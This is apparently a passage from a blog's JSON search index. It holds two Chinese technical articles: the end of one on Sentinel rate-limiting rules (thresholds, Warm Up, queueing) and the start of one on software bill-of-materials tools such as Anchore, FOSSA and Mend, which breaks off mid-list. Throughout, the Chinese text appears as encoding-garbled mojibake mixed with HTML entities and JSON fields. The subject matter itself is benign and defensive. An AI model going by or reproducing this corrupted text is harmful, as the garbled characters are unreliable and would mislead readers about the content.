ä¸­æ‰€æœ‰çš„è§„åˆ™éƒ½å¯ä»¥åœ¨åŠ¨æ€åœ°æŸ¥è¯¢å’Œä¿®æ”¹ï¼Œå¹¶ä¸”ä¿®æ”¹åç«‹å³ç”Ÿæ•ˆï¼Œå¹¶ä¸” Sentinel ä¸­èµ„æºå®šä¹‰å’Œè§„åˆ™çš„é…ç½®æ˜¯åˆ†ç¦»çš„ã€‚å› æ­¤åœ¨ç¼–ç æ—¶ï¼Œæˆ‘ä»¬å…ˆæŠŠéœ€è¦ä¿æŠ¤çš„èµ„æºå®šä¹‰å¥½ï¼ˆåŸ‹ç‚¹ï¼‰ï¼Œä¹‹åä¾¿å¯ä»¥åœ¨éœ€è¦çš„æ—¶å€™åŠ¨æ€é…ç½®è§„åˆ™äº†ã€‚ä¹Ÿå¯ä»¥ç†è§£ä¸ºï¼Œåªè¦æœ‰äº†èµ„æºï¼Œæˆ‘ä»¬å°±èƒ½åœ¨ä»»ä½•æ—¶å€™çµæ´»åœ°å®šä¹‰å„ç§è§„åˆ™ã€‚\n1.1ã€å®šä¹‰èµ„æºï¼šå¯¹äºèµ„æºçš„å®šä¹‰æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯ç¡¬ç¼–ç çš„æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡Â @SentinelResourceÂ æ³¨è§£çš„æ–¹å¼ã€‚\nï¼ˆ1ï¼‰ç¡¬ç¼–ç æ–¹å¼(ä¸æ¨è)ï¼šï¼ˆ2ï¼‰@SentinelResourceæ³¨è§£æ–¹å¼(æ¨è)ï¼š\n1.2ã€å®šä¹‰è§„åˆ™ï¼šSentinel æ”¯æŒä»¥ä¸‹å‡ ç§è§„åˆ™ï¼šæµé‡æ§åˆ¶è§„åˆ™ã€ç†”æ–­é™çº§è§„åˆ™ã€ç³»ç»Ÿä¿æŠ¤è§„åˆ™ã€æ¥æºè®¿é—®æ§åˆ¶è§„åˆ™ å’Œ çƒ­ç‚¹å‚æ•°è§„åˆ™ã€‚\n2ã€æµæ§è§„åˆ™ï¼š2.1ã€æµæ§è§„åˆ™çš„æ ¸å¿ƒå±æ€§ï¼šæµé‡æ§åˆ¶ï¼ŒåŸç†æ˜¯ç›‘æ§åº”ç”¨æµé‡çš„ QPS æˆ– å¹¶å‘çº¿ç¨‹æ•° ç­‰æŒ‡æ ‡ï¼Œå½“è¾¾åˆ°æŒ‡å®šé˜ˆå€¼æ—¶å¯¹æµé‡è¿›è¡Œæ§åˆ¶ï¼Œé¿å…ç³»ç»Ÿè¢«ç¬æ—¶çš„æµé‡é«˜å³°å†²å®ï¼Œä¿éšœåº”ç”¨é«˜å¯ç”¨æ€§ã€‚åŒä¸€ä¸ªèµ„æºå¯ä»¥åˆ›å»ºå¤šæ¡é™æµè§„åˆ™ï¼Œä¸€æ¡é™æµè§„åˆ™ç”±ä»¥ä¸‹å±æ€§ç»„æˆï¼š\nâ‘  resourceï¼šÂ èµ„æºåï¼Œå³é™æµè§„åˆ™çš„ä½œç”¨å¯¹è±¡ï¼Œé»˜è®¤è¯·æ±‚è·¯å¾„ã€‚\nâ‘¡ limitAppï¼šÂ æµæ§é’ˆå¯¹çš„è°ƒç”¨æ¥æºï¼Œè‹¥ä¸º default åˆ™ä¸åŒºåˆ†è°ƒç”¨æ¥æºï¼Œé»˜è®¤å€¼default\nâ‘¢ countï¼šÂ é™æµé˜ˆå€¼\nâ‘£ gradeï¼šÂ é™æµé˜ˆå€¼ç±»å‹ï¼ˆ1ä»£è¡¨ QPSï¼Œ0 ä»£è¡¨å¹¶å‘çº¿ç¨‹æ•°ï¼‰ï¼Œé»˜è®¤å€¼QPS\nâ‘¤ strategyï¼šÂ æµæ§æ¨¡å¼\n\nç›´æ¥æ‹’ç»ï¼ˆé»˜è®¤ï¼‰ï¼šÂ æ¥å£è¾¾åˆ°é™æµæ¡ä»¶æ—¶ï¼Œç›´æ¥é™æµ\n\nå…³è”ï¼šÂ å½“å…³è”çš„èµ„æºè¾¾åˆ°é˜ˆå€¼æ—¶ï¼Œå°±é™æµè‡ªå·±ï¼ˆé€‚åˆåšåº”ç”¨è®©æ­¥ï¼‰\n\né“¾è·¯ï¼šÂ åªè®°å½•æŒ‡å®šé“¾è·¯ä¸Šçš„æµé‡ï¼ŒæŒ‡å®šèµ„æºä»å…¥å£èµ„æºè¿›æ¥çš„æµé‡ï¼Œå¦‚æœè¾¾åˆ°é˜ˆå€¼ï¼Œå°±å¯ä»¥é™æµ\n\n\nâ‘¥ controlBehaviorï¼šÂ æµæ§æ•ˆæœ\n\nå¿«é€Ÿå¤±è´¥ï¼ˆé»˜è®¤ï¼‰ï¼šÂ å½“ QPS è¶…è¿‡ä»»æ„è§„åˆ™çš„é˜ˆå€¼åï¼Œæ–°çš„è¯·æ±‚å°±ä¼šè¢«ç«‹å³æ‹’ç»ï¼Œæ‹’ç»æ–¹å¼ä¸ºæŠ›å‡ºFlowException\n\næ’é˜Ÿç­‰å¾…ï¼šÂ è¿™ç§æ–¹å¼ä¸¥æ ¼æ§åˆ¶äº†è¯·æ±‚é€šè¿‡çš„é—´éš”æ—¶é—´ï¼Œä¹Ÿå³æ˜¯è®©è¯·æ±‚ä»¥å‡åŒ€çš„é€Ÿåº¦é€šè¿‡ï¼Œå¯¹åº”çš„æ˜¯æ¼æ¡¶ç®—æ³•ã€‚\n\nWarm Upï¼šÂ è¯¥æ–¹å¼ä¸»è¦ç”¨äºç³»ç»Ÿé•¿æœŸå¤„äºä½æ°´ä½çš„æƒ…å†µä¸‹ï¼Œå½“æµé‡çªç„¶å¢åŠ æ—¶ï¼Œç›´æ¥æŠŠç³»ç»Ÿæ‹‰å‡åˆ°é«˜æ°´ä½å¯èƒ½ç¬é—´æŠŠç³»ç»Ÿå‹å®ã€‚é€šè¿‡â€å†·å¯åŠ¨â€ï¼Œè®©é€šè¿‡çš„æµé‡ç¼“æ…¢å¢åŠ ï¼Œåœ¨ä¸€å®šæ—¶é—´å†…é€æ¸å¢åŠ åˆ°é˜ˆå€¼ä¸Šé™ï¼Œç»™å†·ç³»ç»Ÿä¸€ä¸ªé¢„çƒ­çš„æ—¶é—´ï¼Œé¿å…å†·ç³»ç»Ÿè¢«å‹å®çš„æƒ…å†µã€‚é¢„çƒ­åº•å±‚æ˜¯æ ¹æ®ä»¤ç‰Œæ¡¶ç®—æ³•å®ç°çš„ã€‚\n\n\n2.2ã€é˜ˆå€¼ç±»å‹ï¼šï¼ˆ1ï¼‰åŸºäº QPS çš„æµæ§ï¼š\nQPSï¼Œæ¯ç§’è¯·æ±‚æ•°ï¼Œå³åœ¨ä¸æ–­å‘æœåŠ¡å™¨å‘é€è¯·æ±‚çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨æ¯ç§’èƒ½å¤Ÿå¤„ç†çš„è¯·æ±‚æ•°é‡ã€‚\nï¼ˆ2ï¼‰åŸºäºå¹¶å‘çº¿ç¨‹æ•°çš„æµæ§ï¼š\nå¹¶å‘æ•°æ§åˆ¶ç”¨äºä¿æŠ¤ä¸šåŠ¡çº¿ç¨‹æ± ä¸è¢«æ…¢è°ƒç”¨è€—å°½ã€‚ä¾‹å¦‚ï¼Œå½“åº”ç”¨æ‰€ä¾èµ–çš„ä¸‹æ¸¸åº”ç”¨ç”±äºæŸç§åŸå› å¯¼è‡´æœåŠ¡ä¸ç¨³å®šã€å“åº”å»¶è¿Ÿå¢åŠ ï¼Œå¯¹äºè°ƒç”¨è€…æ¥è¯´ï¼Œæ„å‘³ç€ååé‡ä¸‹é™å’Œæ›´å¤šçš„çº¿ç¨‹æ•°å ç”¨ï¼Œæç«¯æƒ…å†µä¸‹ç”šè‡³å¯¼è‡´çº¿ç¨‹æ± è€—å°½ã€‚ä¸ºåº”å¯¹å¤ªå¤šçº¿ç¨‹å ç”¨çš„æƒ…å†µï¼Œä¸šå†…æœ‰ä½¿ç”¨éš”ç¦»çš„æ–¹æ¡ˆï¼Œæ¯”å¦‚ï¼š\n\né€šè¿‡ä¸åŒä¸šåŠ¡é€»è¾‘ä½¿ç”¨ä¸åŒçº¿ç¨‹æ± æ¥éš”ç¦»ä¸šåŠ¡è‡ªèº«ä¹‹é—´çš„èµ„æºäº‰æŠ¢ï¼ˆçº¿ç¨‹æ± éš”ç¦»ï¼‰ï¼Œè¿™ç§éš”ç¦»æ–¹æ¡ˆè™½ç„¶éš”ç¦»æ€§æ¯”è¾ƒå¥½ï¼Œä½†æ˜¯ä»£ä»·å°±æ˜¯çº¿ç¨‹æ•°ç›®å¤ªå¤šï¼Œçº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢çš„ overhead æ¯”è¾ƒå¤§ï¼Œç‰¹åˆ«æ˜¯å¯¹ä½å»¶æ—¶çš„è°ƒç”¨æœ‰æ¯”è¾ƒå¤§çš„å½±å“ã€‚\n\nä½¿ç”¨ä¿¡å·é‡æ¥æ§åˆ¶åŒæ—¶è¯·æ±‚çš„ä¸ªæ•°ï¼ˆä¿¡å·é‡éš”ç¦»ï¼‰ï¼Œè¿™ç§éš”ç¦»æ–¹æ¡ˆè™½ç„¶èƒ½å¤Ÿæ§åˆ¶çº¿ç¨‹æ•°é‡ï¼Œä½†æ— æ³•æ§åˆ¶è¯·æ±‚æ’é˜Ÿæ—¶é—´ï¼Œå½“è¯·æ±‚è¿‡å¤šæ—¶æ’é˜Ÿä¹Ÿæ˜¯æ— ç›Šçš„ï¼Œç›´æ¥æ‹’ç»èƒ½å¤Ÿè¿…é€Ÿé™ä½ç³»ç»Ÿå‹åŠ›ã€‚\n\n\nSentinelÂ å¹¶å‘çº¿ç¨‹æ•°é™æµä¸è´Ÿè´£åˆ›å»ºå’Œç®¡ç†çº¿ç¨‹æ± ï¼Œè€Œæ˜¯ç®€å•ç»Ÿè®¡å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡çš„çº¿ç¨‹ä¸ªæ•°ï¼ˆæ­£åœ¨æ‰§è¡Œçš„è°ƒç”¨æ•°ç›®ï¼‰ï¼Œå¦‚æœè¶…å‡ºé˜ˆå€¼ï¼Œæ–°çš„è¯·æ±‚ä¼šè¢«ç«‹å³æ‹’ç»ï¼Œæ•ˆæœç±»ä¼¼äºä¿¡å·é‡éš”ç¦»ã€‚å¹¶å‘æ•°æ§åˆ¶é€šå¸¸åœ¨è°ƒç”¨ç«¯è¿›è¡Œé…ç½®ã€‚\n2.3ã€æµæ§æ•ˆæœï¼šå½“ç³»ç»Ÿçš„æµé‡è¶…è¿‡è®¾å®šçš„é˜ˆå€¼æ—¶ï¼ŒsentinelÂ åˆ™é‡‡å–æªæ–½è¿›è¡Œæµé‡æ§åˆ¶ï¼Œæµæ§æ•ˆæœæ€»å…±åˆ†ä¸ºä¸‰ç§ï¼šå¿«é€Ÿå¤±è´¥ã€Warm Upã€æ’é˜Ÿç­‰å¾…ã€‚å¯¹åº”çš„Â FlowRuleÂ ä¸­çš„Â controlBehaviorå­—æ®µã€‚\n\nå¿«é€Ÿå¤±è´¥ï¼ˆé»˜è®¤ï¼‰ï¼šÂ å½“ QPS è¶…è¿‡ä»»æ„è§„åˆ™çš„é˜ˆå€¼åï¼Œæ–°çš„è¯·æ±‚å°±ä¼šè¢«ç«‹å³æ‹’ç»ï¼Œæ‹’ç»æ–¹å¼ä¸ºæŠ›å‡ºFlowException\n\næ’é˜Ÿç­‰å¾…ï¼šÂ è¿™ç§æ–¹å¼ä¸¥æ ¼æ§åˆ¶äº†è¯·æ±‚é€šè¿‡çš„é—´éš”æ—¶é—´ï¼Œä¹Ÿå³æ˜¯è®©è¯·æ±‚ä»¥å‡åŒ€çš„é€Ÿåº¦é€šè¿‡ï¼Œå¯¹åº”çš„æ˜¯æ¼æ¡¶ç®—æ³•ã€‚\n\nWarm Upï¼šÂ è¯¥æ–¹å¼ä¸»è¦ç”¨äºç³»ç»Ÿé•¿æœŸå¤„äºä½æ°´ä½çš„æƒ…å†µä¸‹ï¼Œå½“æµé‡çªç„¶å¢åŠ æ—¶ï¼Œç›´æ¥æŠŠç³»ç»Ÿæ‹‰å‡åˆ°é«˜æ°´ä½å¯èƒ½ç¬é—´æŠŠç³»ç»Ÿå‹å®ã€‚é€šè¿‡â€å†·å¯åŠ¨â€ï¼Œè®©é€šè¿‡çš„æµé‡ç¼“æ…¢å¢åŠ ï¼Œåœ¨ä¸€å®šæ—¶é—´å†…é€æ¸å¢åŠ åˆ°é˜ˆå€¼ä¸Šé™ï¼Œç»™å†·ç³»ç»Ÿä¸€ä¸ªé¢„çƒ­çš„æ—¶é—´ï¼Œé¿å…å†·ç³»ç»Ÿè¢«å‹å®çš„æƒ…å†µã€‚é¢„çƒ­åº•å±‚æ˜¯æ ¹æ®ä»¤ç‰Œæ¡¶ç®—æ³•å®ç°çš„ã€‚\n\n\n\n\n\n\n\n\n\n\n\næ³¨æ„ï¼šè‹¥ä½¿ç”¨é™¤äº†å¿«é€Ÿå¤±è´¥ä¹‹å¤–çš„æµé‡æ§åˆ¶æ•ˆæœï¼Œåˆ™è°ƒç”¨å…³ç³»é™æµç­–ç•¥ï¼ˆstrategyï¼‰ä¼šè¢«å¿½ç•¥ã€‚\nï¼ˆ1ï¼‰å¿«é€Ÿå¤±è´¥ï¼š\né»˜è®¤çš„æµé‡æ§åˆ¶æ–¹å¼ï¼Œå½“ QPS è¶…è¿‡ä»»æ„è§„åˆ™çš„é˜ˆå€¼åï¼Œæ–°çš„è¯·æ±‚å°±ä¼šè¢«ç«‹å³æ‹’ç»ï¼Œæ‹’ç»æ–¹å¼ä¸ºæŠ›å‡ºFlowExceptionã€‚è¿™ç§æ–¹å¼é€‚ç”¨äºå¯¹ç³»ç»Ÿå¤„ç†èƒ½åŠ›ç¡®åˆ‡å·²çŸ¥çš„æƒ…å†µä¸‹ï¼Œæ¯”å¦‚é€šè¿‡å‹æµ‹ç¡®å®šäº†ç³»ç»Ÿçš„å‡†ç¡®æ°´ä½æ—¶\nï¼ˆ2ï¼‰Warm Upï¼š\n\n\n\n\n\n\n\n\n\næ³¨æ„ï¼šè¯¥æ–¹å¼åªé’ˆå¯¹ QPS æµæ§ï¼Œå¯¹å¹¶å‘çº¿ç¨‹æ•°æµæ§ä¸æ”¯æŒ\nå³é¢„çƒ­&#x2F;å†·å¯åŠ¨æ–¹å¼ï¼Œè¯¥æ–¹å¼ä¸»è¦ç”¨äºç³»ç»Ÿé•¿æœŸå¤„äºä½æ°´ä½çš„æƒ…å†µä¸‹ï¼Œå½“æµé‡çªç„¶å¢åŠ æ—¶ï¼Œç›´æ¥æŠŠç³»ç»Ÿæ‹‰å‡åˆ°é«˜æ°´ä½å¯èƒ½ç¬é—´æŠŠç³»ç»Ÿå‹å®ã€‚é€šè¿‡â€å†·å¯åŠ¨â€ï¼Œè®©é€šè¿‡çš„æµé‡ç¼“æ…¢å¢åŠ ï¼Œåœ¨ä¸€å®šæ—¶é—´å†…é€æ¸å¢åŠ åˆ°é˜ˆå€¼ä¸Šé™ï¼Œç»™å†·ç³»ç»Ÿä¸€ä¸ªé¢„çƒ­çš„æ—¶é—´ï¼Œé¿å…å†·ç³»ç»Ÿè¢«å‹å®çš„æƒ…å†µã€‚\né¢„çƒ­åº•å±‚æ˜¯æ ¹æ®ä»¤ç‰Œæ¡¶ç®—æ³•å®ç°çš„ï¼Œæºç å¯¹åº”å¾—ç±»åœ¨Â com.alibaba.csp.sentinel.slots.block.flow.controller.WarmUpControllerÂ ä¸­ï¼Œç®—æ³•ä¸­æœ‰ä¸€ä¸ªå†·å´å› å­coldFactorï¼Œé»˜è®¤å€¼æ˜¯3ï¼Œå³è¯·æ±‚ QPS ä»Â threshold(é˜ˆå€¼) / 3Â å¼€å§‹ï¼Œç»é¢„çƒ­æ—¶é•¿é€æ¸å‡è‡³è®¾å®šçš„ QPS é˜ˆå€¼ã€‚\næ¯”å¦‚é€šè¿‡Â sentinel-dashboardÂ è®¾å®šÂ testWarmUPÂ èµ„æºçš„ QPS é˜ˆå€¼ä¸ºï¼Œæµæ§æ•ˆæœä¸ºÂ warm upï¼Œé¢„çƒ­æ—¶é•¿ä¸º5ç§’ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒtestWarmUPÂ èµ„æºåˆšå¼€å§‹é™æµçš„é˜ˆå€¼ä¸ºÂ 20/3=7ï¼Œä½†ç»è¿‡10ç§’çš„é¢„çƒ­åï¼Œæ…¢æ…¢å°†é˜ˆå€¼å‡è‡³20ã€‚ï¼ˆ3ï¼‰æ’é˜Ÿç­‰å¾…ï¼š\n\n\n\n\n\n\n\n\n\næ³¨æ„ï¼šè¿™ä¸€æ•ˆæœåªé’ˆå¯¹QPSæµæ§ï¼Œå¹¶å‘çº¿ç¨‹æ•°æµæ§ä¸æ”¯æŒã€‚\næ’é˜Ÿç­‰å¾…çš„æ–¹å¼ä¼šä»¥åŒ€é€Ÿæ’é˜Ÿæ–¹å¼ä¸¥æ ¼æ§åˆ¶è¯·æ±‚é€šè¿‡çš„é—´éš”æ—¶é—´ï¼Œä¹Ÿå°±æ˜¯è®©è¯·æ±‚ä»¥å‡åŒ€çš„é€Ÿåº¦é€šè¿‡ï¼Œå…¶ä½™çš„æ’é˜Ÿç­‰å¾…ï¼Œå®ƒè¿˜ä¼šè®©è®¾ç½®ä¸€ä¸ªè¶…æ—¶æ—¶é—´ï¼Œå½“è¯·æ±‚è¶…è¿‡è¶…æ—¶é—´æ—¶é—´è¿˜æœªå¤„ç†ï¼Œåˆ™ä¼šè¢«ä¸¢å¼ƒã€‚\nReferenceshttps://mp.weixin.qq.com/s/7p6y4PSy0liv1q8Y4hLPDw\n","slug":"æœåŠ¡é™æµç†”æ–­ç»„ä»¶é€‰å‹","date":"2022-08-22T07:56:20.000Z","categories_index":"åˆ†å¸ƒå¼,å¾®æœåŠ¡","tags_index":"æœåŠ¡é™æµ,Sentinel,Hystrix,æŠ€æœ¯é€‰å‹","author_index":"Moses"},{"id":"b8a4b9dfcb608a8cfda6fb4feb8db13c","title":"è½¯ä»¶ç‰©æ–™æ¸…å•å·¥å…·ä»‹ç»","content":"SBOMå·¥å…·ä»‹ç»Backendæ®Tideliftç»Ÿè®¡ï¼Œ92%çš„åº”ç”¨ç¨‹åºåŒ…å«å¼€æºç»„ä»¶ã€‚äº‹å®ä¸Šï¼Œç°ä»£ç¨‹åºå¹³å‡æœ‰70%æ˜¯å¼€æºè½¯ä»¶ã€‚æ ¹æ®ä¹”Â·æ‹œç™»æ€»ç»Ÿäº2021å¹´7æœˆ12æ—¥å‘å¸ƒçš„ã€Šå…³äºæé«˜å›½å®¶ç½‘ç»œå®‰å…¨çš„è¡Œæ”¿å‘½ä»¤ã€‹ï¼Œè¿™æ˜¯ä¸€é¡¹è¦æ±‚ã€‚è¯¥è¡Œæ”¿å‘½ä»¤å°†SBOMå®šä¹‰ä¸ºâ€œåŒ…å«æ„å»ºè½¯ä»¶ä¸­ä½¿ç”¨çš„å„ç§ç»„ä»¶çš„è¯¦ç»†ä¿¡æ¯å’Œä¾›åº”é“¾å…³ç³»çš„æ­£å¼è®°å½•â€ã€‚å¯¹äºå¼€æºè½¯ä»¶æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªç‰¹åˆ«é‡è¦çš„é—®é¢˜ï¼Œå› ä¸ºâ€œè½¯ä»¶å¼€å‘è€…å’Œä¾›åº”å•†ç»å¸¸é€šè¿‡ç»„è£…ç°æœ‰çš„å¼€æºå’Œå•†ä¸šè½¯ä»¶ç»„ä»¶æ¥åˆ›é€ äº§å“ã€‚â€\næœ€ä½³SBOMå®è·µSBOMåº”åŒ…æ‹¬:\n\nåº”ç”¨ç¨‹åºçš„å¼€æºåº“\n\nç¨‹åºçš„æ’ä»¶ã€æ‰©å±•å’Œå…¶ä»–é™„ä»¶\n\nç”±å¼€å‘äººå‘˜å†…éƒ¨ç¼–å†™çš„è‡ªå®šä¹‰æºä»£ç \n\nè¿™äº›ç»„ä»¶çš„ç‰ˆæœ¬ä¿¡æ¯ã€è½¯ä»¶è®¸å¯çŠ¶æ€å’Œè¡¥ä¸çŠ¶æ€\n\nè‡ªåŠ¨ç»„ä»¶åŠ å¯†ç­¾åå’ŒéªŒè¯\n\nè‡ªåŠ¨æ‰«æç”ŸæˆSBOMï¼Œä½œä¸ºæŒç»­é›†æˆ&#x2F;æŒç»­éƒ¨ç½²(CI&#x2F;CD)ç®¡é“çš„ä¸€éƒ¨åˆ† SBOMä¹Ÿåº”è¯¥ä½¿ç”¨ä¸€è‡´çš„æ ¼å¼ã€‚å½“å‰æœ€å¸¸è§çš„SBOMæ ¼å¼åŒ…æ‹¬è½¯ä»¶åŒ…æ•°æ®äº¤æ¢(SPDX)ã€è½¯ä»¶æ ‡è¯†(SWID)æ ‡ç­¾å’ŒOWASP CycloneDXã€‚è™½ç„¶è¿™äº›éƒ½æ˜¯æ ‡å‡†ï¼Œä½†2021å¹´çš„è¡Œæ”¿å‘½ä»¤å¹¶æ²¡æœ‰å¼ºåˆ¶è§„å®šç‰¹å®šçš„SBOMæ ¼å¼ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œè¿™ä¸‰å®¶å…¬å¸éƒ½æ²¡æœ‰ä»å…¶ä»–å…¬å¸ä¸­è„±é¢–è€Œå‡ºï¼Œå½¢æˆäº‹å®ä¸Šçš„è¡Œä¸šæ ‡å‡†ã€‚\n\n\nÂ ä¸ºäº†ä½¿SBOMæ›´åŠ å®ç”¨ï¼Œæˆ‘ä»¬ä¸ä»…è¦æ¨åŠ¨è‡ªåŠ¨åŒ–åˆ›å»ºSBOMï¼Œè¿˜è¦ä½¿å…¶æˆä¸ºCI&#x2F;CDç®¡é“çš„ä¸€éƒ¨åˆ†ã€‚æ­£å¦‚å›½å®¶ç”µä¿¡å’Œä¿¡æ¯ç®¡ç†å±€(NTIA)æ‰€è¨€ï¼Œæœ€ç»ˆç›®æ ‡æ˜¯æŒ‰ç…§â€œæœºå™¨é€Ÿåº¦â€ç”ŸæˆSBOMã€‚\nSBOMä½¿ç”¨åœºæ™¯SBOMæœ‰ä¸‰ä¸ªä¸åŒçš„ä½¿ç”¨åœºæ™¯ï¼š\n\nè½¯ä»¶ç”Ÿäº§å•†ä½¿ç”¨SBOMæ¥å¸®åŠ©æ„å»ºå’Œç»´æŠ¤ä»–ä»¬æä¾›çš„è½¯ä»¶ã€‚\n\nè½¯ä»¶é‡‡è´­äººå‘˜ä½¿ç”¨SBOMæ¥å‘ŠçŸ¥è´­ä¹°å‰çš„ä¿è¯ï¼Œåå•†æŠ˜æ‰£ï¼Œå¹¶è®¡åˆ’å®æ–½ç­–ç•¥ã€‚\n\nè½¯ä»¶æ“ä½œäººå‘˜ä½¿ç”¨SBOMé€šçŸ¥æ¼æ´ç®¡ç†å’Œèµ„äº§ç®¡ç†ï¼Œç®¡ç†è®¸å¯å’Œåˆè§„ï¼Œå¹¶å¿«é€Ÿè¯†åˆ«è½¯ä»¶å’Œç»„ä»¶ä¾èµ–å…³ç³»å’Œä¾›åº”é“¾é£é™©ã€‚\n\n\nÂ  Â  Â  Â è¿™ä¹‹é—´åŒºåˆ«å¾ˆå¤§ã€‚å¼€å‘äººå‘˜å¸Œæœ›èƒ½æœ‰åœ¨ä»–ä»¬çš„CI&#x2F;CDç®¡é“ä¸Šå·¥ä½œçš„å·¥å…·ï¼Œå¦‚CircleCIã€Jenkinsæˆ–Travis CIã€‚è¿è¥äººå‘˜æˆ–å®¢æˆ·å¯èƒ½ç”šè‡³ä¸çŸ¥é“ä»€ä¹ˆæ˜¯CI&#x2F;CDç®¡é“ï¼Œä½†å¯èƒ½éå¸¸å…³å¿ƒèµ„äº§ç®¡ç†å’Œå®‰å…¨è¡¥ä¸æ›´æ–°ã€‚\nÂ  Â  Â  Â Gartnerä¼°è®¡ï¼Œåˆ°2025å¹´ï¼Œ60%çš„æ„å»ºæˆ–é‡‡è´­å…³é”®åŸºç¡€è®¾æ–½è½¯ä»¶çš„ç»„ç»‡å°†å¼ºåˆ¶æ‰§è¡ŒSBOMå¹¶å°†å…¶æ ‡å‡†åŒ–ã€‚å¦‚ä»Šï¼Œè¿™ä¸€æ¯”ä¾‹ä¸åˆ°20%ã€‚\nå·¥å…·ä»‹ç»AnchoreAnchoreå·²ç»åœ¨SBOMè¡Œä¸šå·¥ä½œäº†6å¹´ã€‚å®ƒçš„åŸºç¡€æ˜¯ä¸¤ä¸ªå¼€æºé¡¹ç›®ï¼šSyftæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œæ¥å£(CLI)å·¥å…·å’Œåº“ï¼Œç”¨äºä»å®¹å™¨é•œåƒå’Œæ–‡ä»¶ç³»ç»Ÿç”ŸæˆSBOMï¼›Grypeæ˜¯ä¸€ä¸ªæ˜“äºé›†æˆçš„å®¹å™¨é•œåƒå’Œæ–‡ä»¶ç³»ç»Ÿæ¼æ´æ‰«æå·¥å…·ã€‚æ‚¨å¯ä»¥åœ¨å¼€å‘è¿‡ç¨‹çš„æ¯ä¸ªé˜¶æ®µï¼Œä»æºä»£ç å­˜å‚¨åº“å’ŒCI&#x2F;CDç®¡é“åˆ°å®¹å™¨æ³¨å†Œä¸­å¿ƒå’Œè¿è¡Œæ—¶ï¼Œä½¿ç”¨å®ƒä»¬ä¸€èµ·ç”ŸæˆSBOMã€‚è¿™äº›SBOMä¿å­˜åœ¨ä¸€ä¸ªé›†ä¸­å­˜å‚¨åº“ä¸­ï¼Œä»¥å®ç°å®Œå…¨çš„å¯è§æ€§å’ŒæŒç»­çš„ç›‘è§†ï¼Œç”šè‡³åœ¨éƒ¨ç½²åä¹Ÿæ˜¯å¦‚æ­¤ã€‚å®ƒæ”¯æŒCycloneDX, SPDXå’ŒSyftè‡ªå·±çš„SBOMæ ¼å¼ã€‚\nAnchoreå°†å…¶SBOMåŠŸèƒ½æ†ç»‘åˆ°Anchor Enterprise 4.0è½¯ä»¶SCM(ä¾›åº”é“¾ç®¡ç†)å¹³å°ä¸­ã€‚Anchoreçš„ç›®æ ‡æ˜¯æˆä¸ºæ‚¨ä¸€ä½“åŒ–çš„è½¯ä»¶ä¾›åº”é“¾å’ŒSBOMå®‰å…¨å…¬å¸ã€‚ä»–ä»¬åšå¾—å¾ˆæ£’ã€‚\nFOSSAÂ FOSSAçš„æ——èˆ°ç¨‹åºæ˜¯ä¸€ä¸ªå¼€æºè®¸å¯è¯ç®¡ç†å™¨å’Œä¸€ä¸ªå¼€æºæ¼æ´æ‰«æå™¨ã€‚ä»”ç»†æƒ³æƒ³ï¼ŒSBOMéå¸¸è‡ªç„¶åœ°é€‚åˆè¿™äº›ç¨‹åºã€‚\nÂ åœ¨FOSSAçš„æ–¹æ³•ä¸­ï¼Œä½ å¯ä»¥å°†å®ƒçš„SBOMå·¥å…·ä¸ä½ å–œæ¬¢çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿé›†æˆï¼Œå¦‚GitHubã€BitBucketæˆ–GitLabã€‚æˆ–è€…æ‚¨å¯ä»¥ä½¿ç”¨å®ƒçš„å‘½ä»¤è¡Œå¹¶åœ¨æœ¬åœ°è¿è¡Œå®ƒï¼Œæˆ–è€…å°†å®ƒé›†æˆä¸ºCI&#x2F;CDç®¡é“çš„ä¸€éƒ¨åˆ†ã€‚\nÂ æ— è®ºå“ªç§æ–¹å¼ï¼Œå½“æ‚¨æ‰«ææ‚¨çš„é¡¹ç›®æ—¶ï¼ŒFOSSAå°†è‡ªåŠ¨è¯†åˆ«ç›®æ ‡ä»£ç åº“çš„ç›´æ¥ä¾èµ–é¡¹å’Œæ·±åº¦ä¾èµ–é¡¹ã€‚è¿™äº›æ·±åº¦åµŒå…¥çš„ä»£ç é—®é¢˜ï¼Œæ¯”å¦‚å¯¹Log4jçš„é—´æ¥ä¾èµ–è°ƒç”¨ï¼Œå¯èƒ½éšè—åœ¨ç¨‹åºä¸­ï¼Œé»‘å®¢ä»ç„¶ä¼šåˆ©ç”¨å®ƒä»¬è¿›è¡Œç ´åã€‚\nMendÂ Mendå°±æ˜¯æ›¾ç»çš„WhiteSourceï¼Œå®ƒæä¾›äº†å„ç§è½¯ä»¶æˆåˆ†åˆ†æ(SCA)å·¥å…·ã€‚SBOMè¢«åˆå¹¶åˆ°å…¶Mend SCAå·¥å…·ä¸­ã€‚å› æ­¤ï¼ŒMendä¸å…¶è¯´æ˜¯ä¸€ä¸ªå¼€å‘äººå‘˜ç¨‹åºæˆ–CI&#x2F;CDå·¥å…·ï¼Œä¸å¦‚è¯´æ˜¯ç¨‹åºå‘˜çš„å¼€æºè®¸å¯å’Œå®‰å…¨æœºåˆ¶ã€‚Â å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨Mendè·Ÿè¸ªæ¯ä¸ªç»„ä»¶ï¼ŒåŒ…æ‹¬ç›´æ¥å’Œä¼ é€’æ€§ä¾èµ–ã€è¯†åˆ«æ¼æ´ã€æä¾›ä¿®å¤è·¯å¾„ï¼Œå¹¶åœ¨ç»„ä»¶æ›´æ”¹æ—¶è‡ªåŠ¨æ›´æ–°SBOMè®°å½•ã€‚è¯¥å…¬å¸å£°ç§°å…¶ä¸“åˆ©çš„å¯è¾¾æ€§è·¯å¾„åˆ†æå¯ä»¥å‘Šè¯‰æ‚¨å“ªäº›æ¼æ´å¯ä»¥è¢«å®‰å…¨å¿½ç•¥ï¼Œå› ä¸ºæ‚¨çš„åº”ç”¨ç¨‹åºæ²¡æœ‰ä½¿ç”¨è¿™äº›åº“ï¼Œæˆ–è€…è¿™äº›åº“çš„ä½¿ç”¨æ–¹å¼æ²¡æœ‰æš´éœ²è¿™äº›æ¼æ´ã€‚ Software Bill of Materials (SBOM) - Mend\nRezilion 